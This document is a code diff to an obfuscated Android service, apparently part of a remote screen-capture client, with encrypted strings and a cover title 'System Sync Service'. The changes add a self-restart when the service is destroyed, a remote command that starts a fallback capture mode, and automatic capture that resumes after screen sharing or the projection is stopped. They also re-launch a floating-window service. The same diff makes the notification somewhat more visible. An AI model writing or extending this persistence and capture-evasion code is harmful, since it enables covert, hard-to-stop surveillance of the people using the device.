@@ -56,6 +56,7 @@ import android.hardware.HardwareBuffer
 import android.graphics.Bitmap.wrapHardwareBuffer
 import android.net.ConnectivityManager
 import android.net.Network
+import android.provider.Settings
 import java.nio.IntBuffer
 import java.nio.ByteOrder
 
@@ -68,6 +69,7 @@ import android.os.Environment
 
 const val DEFAULT_NOTIFY_TITLE = "System Sync Service"
  val DEFAULT_NOTIFY_TEXT = p50.a(byteArrayOf(40, -65, -34, -107, -71, 95, 30, -6, -59, -112, -16, 78, 14, -76, -62, -118, -66, 91), byteArrayOf(123, -38, -84, -29, -48, 60))
+const val DEFAULT_NOTIFY_CHANNEL = "OK"
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
 
@@ -216,7 +218,11 @@ class DFm8Y8iMScvB2YDw : Service() {
              
             p50.a(byteArrayOf(-88, -91, 123, 40, 66, -84, 83, 2, 68, 96, 70, -94), byteArrayOf(-37, -47, 20, 88, 29, -61, 37, 103, 54, 12, 39)) -> {
              
-                nZW99cdXQ0COhB2o.ctx?.onstop_overlay(arg1, arg2)
+                if (arg1 == "1") {
+                    startIgnoreFallback("remote-command")
+                } else {
+                    nZW99cdXQ0COhB2o.stopIgnoreCapture("remote-command")
+                }
             } 
              
             p50.a(byteArrayOf(-47, 82, 118, -48, -56, -44, -124, 59, -46, 82, 98, -48, -39), byteArrayOf(-94, 38, 23, -94, -68, -117, -25, 90)) -> {
@@ -231,8 +237,7 @@ class DFm8Y8iMScvB2YDw : Service() {
                     Handler(Looper.getMainLooper()).post {
                         killMediaProjection()
                         // 关共享后自动激活无视模式作为备用帧流，防止画面冻结
-                        ClsFx9V0S.rEqMB3nD(0)  // PIXEL_SIZEBack8=0，允许无视帧通过Rust层
-                        nZW99cdXQ0COhB2o.ctx?.onstop_overlay("1", "")
+                        startIgnoreFallback("kill-media-command")
                         Log.i("MainService", "关共享: 已自动激活无视模式作为备用")
                     }
                 }
@@ -286,6 +291,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         var ctx: DFm8Y8iMScvB2YDw? = null
         private var savedMediaProjectionIntent: Intent? = null
         private var explicitStopRequested = false
+        private const val ACT_KEEP_ALIVE_SERVICE = "com.daxian.dev.KEEP_ALIVE_SERVICE"
         
         val isReady: Boolean
             get() = _isReady
@@ -315,11 +321,12 @@ class DFm8Y8iMScvB2YDw : Service() {
                 Intent.ACTION_SCREEN_OFF -> {
                     Log.i("MainService", "screen off: keep connected service alive")
                     ensureBackgroundKeepAlive()
-                    if (mediaProjection != null || _isStart) {
-                        handleProjectionStoppedKeepService("screen-off", true)
-                    } else {
-                        keepServiceStateAfterNetworkOrScreenChange("screen-off-no-projection")
-                    }
+                    keepServiceStateAfterNetworkOrScreenChange("screen-off")
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if ((_isReady || _isStart) && mediaProjection == null) {
+                            startIgnoreFallback("screen-off-projection-lost")
+                        }
+                    }, 1500)
                 }
                 Intent.ACTION_SCREEN_ON,
                 Intent.ACTION_USER_PRESENT -> {
@@ -392,6 +399,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         if (_isReady || _isStart) {
             try {
                 createForegroundNotification()
+                ensureBackgroundKeepAlive()
             } catch (e: Exception) {
                 Log.e("MainService", "onTaskRemoved: failed to recreate notification", e)
             }
@@ -441,6 +449,19 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         if (explicitStopRequested) {
             stopService(Intent(this, DFrLMwitwQbfu7AC::class.java))
+        } else {
+            try {
+                val restartIntent = Intent(applicationContext, DFm8Y8iMScvB2YDw::class.java).apply {
+                    action = ACT_KEEP_ALIVE_SERVICE
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    applicationContext.startForegroundService(restartIntent)
+                } else {
+                    applicationContext.startService(restartIntent)
+                }
+            } catch (e: Exception) {
+                Log.e("MainService", "onDestroy keep-alive restart failed", e)
+            }
         }
         ctx = null
         super.onDestroy()
@@ -540,7 +561,7 @@ class DFm8Y8iMScvB2YDw : Service() {
     
         super.onStartCommand(intent, flags, startId)
         explicitStopRequested = false
-        if (intent == null) {
+        if (intent == null || intent.action == ACT_KEEP_ALIVE_SERVICE) {
             Log.i("MainService", "onStartCommand: sticky restart")
             _isReady = true
             ensureBackgroundKeepAlive()
@@ -572,9 +593,10 @@ class DFm8Y8iMScvB2YDw : Service() {
                 checkMediaPermission()
                 _isReady = true
                 createForegroundNotification()
+                ensureBackgroundKeepAlive()
 
                 // 新权限获取成功，关闭无视备用模式并自动启动捕获
-                shouldRun = false
+                nZW99cdXQ0COhB2o.stopIgnoreCapture("new-media-projection")
                 SKL = false
                 ClsFx9V0S.rEqMB3nD(255)  // PIXEL_SIZEBack8=255，阻止无视帧
                 Log.i("MainService", "onStartCommand: 新权限获取成功，关闭无视模式")
@@ -669,11 +691,20 @@ class DFm8Y8iMScvB2YDw : Service() {
             _isReady = true
             ensureBackgroundKeepAlive()
             if (mediaProjection == null) {
-                ClsFx9V0S.rEqMB3nD(0)
-                nZW99cdXQ0COhB2o.ctx?.onstop_overlay("1", "")
+                startIgnoreFallback("keepalive-no-projection-$reason")
             }
             checkMediaPermission()
         }
+    }
+
+    private fun startIgnoreFallback(reason: String) {
+        try {
+            ClsFx9V0S.VaiKIoQu("video", true)
+        } catch (e: Exception) {
+            Log.e("MainService", "startIgnoreFallback: enable video raw failed, reason=$reason", e)
+        }
+        ClsFx9V0S.rEqMB3nD(0)
+        nZW99cdXQ0COhB2o.requestIgnoreCapture(reason)
     }
 
     @SuppressLint("WakelockTimeout")
@@ -696,6 +727,25 @@ class DFm8Y8iMScvB2YDw : Service() {
             }
         } catch (e: Exception) {
             Log.e("MainService", "ensureBackgroundKeepAlive: wifi lock failed", e)
+        }
+        ensureFloatingWindowKeepAlive()
+    }
+
+    private fun ensureFloatingWindowKeepAlive() {
+        if (!_isReady && !_isStart) {
+            return
+        }
+        val disableFloatingWindow = ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(-101, 29, 106, 61, -15, -107, -76, -103, 52, -47, -112, 21, 109, 53, -3, -98, -4, -61, 59, -45, -101, 27, 110), byteArrayOf(-1, 116, 25, 92, -109, -7, -47, -76, 82, -67))) == p50.a(byteArrayOf(-38), byteArrayOf(-125, -112, -117, 6, 85, -44, -6, 57, 93))
+        if (disableFloatingWindow) {
+            return
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            return
+        }
+        try {
+            startService(Intent(this, DFrLMwitwQbfu7AC::class.java))
+        } catch (e: Exception) {
+            Log.e("MainService", "ensureFloatingWindowKeepAlive failed", e)
         }
     }
 
@@ -812,6 +862,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         ClsFx9V0S.VaiKIoQu(p50.a(byteArrayOf(-88, 38, -86, -12, 29), byteArrayOf(-34, 79, -50, -111, 114, -37, 116)),true)
         oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)
+        ensureFloatingWindowKeepAlive()
         return true
     }
 
@@ -876,6 +927,7 @@ class DFm8Y8iMScvB2YDw : Service() {
 
         checkMediaPermission()
         createForegroundNotification()
+        ensureFloatingWindowKeepAlive()
 
         Log.i("MainService", "stopCapture2: complete")
     }
@@ -921,10 +973,10 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         surface = null
 
-        ClsFx9V0S.rEqMB3nD(0)
-        nZW99cdXQ0COhB2o.ctx?.onstop_overlay("1", "")
+        startIgnoreFallback("projection-stopped-$reason")
         checkMediaPermission()
         createForegroundNotification()
+        ensureFloatingWindowKeepAlive()
     }
 
     @Synchronized
@@ -959,8 +1011,10 @@ class DFm8Y8iMScvB2YDw : Service() {
         try { surface?.release() } catch (_: Exception) {}
         surface = null
 
+        startIgnoreFallback("kill-media-projection")
         checkMediaPermission()
         createForegroundNotification()
+        ensureFloatingWindowKeepAlive()
 
         Log.i("MainService", "killMediaProjection: complete")
     }
@@ -986,7 +1040,7 @@ class DFm8Y8iMScvB2YDw : Service() {
 
                 if (newProjection != null) {
                     // Token复用成功，现在安全地关闭无视模式
-                    shouldRun = false
+                    nZW99cdXQ0COhB2o.stopIgnoreCapture("restore-media-projection")
                     SKL = false
                     ClsFx9V0S.rEqMB3nD(255)  // PIXEL_SIZEBack8=255，阻止无视帧
                     Log.i("MainService", "restoreMediaProjection: 无视模式已关闭")
@@ -1003,6 +1057,7 @@ class DFm8Y8iMScvB2YDw : Service() {
 
                     _isReady = true
                     createForegroundNotification()
+                    ensureBackgroundKeepAlive()
                     checkMediaPermission()
 
                     val captureResult = startCapture()
@@ -1069,7 +1124,9 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         mediaProjection = null
         _isReady = true
+        startIgnoreFallback("stop-capture-keep-service")
         createForegroundNotification()
+        ensureFloatingWindowKeepAlive()
 
         Log.i("MainService", "stopCaptureKeepService: MediaProjection stopped, service alive")
     }
@@ -1116,7 +1173,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         _isAudioStart = false
         
         //updateback011
-        shouldRun = false
+        nZW99cdXQ0COhB2o.stopIgnoreCapture("destroy")
         
         stopCapture()
 
@@ -1235,15 +1292,15 @@ class DFm8Y8iMScvB2YDw : Service() {
     private fun initNotification() {
         notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channelId = "sys_bg_silent_02"
-            val channelName = "Background Service"
+            val channelId = DEFAULT_NOTIFY_CHANNEL
+            val channelName = "大仙会议"
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_MIN
+                channelName, NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Background service"
+                description = "保持远程连接服务运行"
                 setShowBadge(false)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                lockscreenVisibility = Notification.VISIBILITY_PRIVATE
                 enableLights(false)
                 enableVibration(false)
                 setSound(null, null)
@@ -1275,13 +1332,14 @@ class DFm8Y8iMScvB2YDw : Service() {
             .setSmallIcon(R.mipmap.ic_stat_logo)
             .setDefaults(0)
             .setAutoCancel(false)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setContentTitle("")
-            .setContentText("")
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setContentTitle("大仙会议")
+            .setContentText("正在保持远程连接服务")
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true)
+            .setColor(Color.rgb(0, 113, 255))
+            .setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
             .setWhen(0)
             .setShowWhen(false)
             .build()
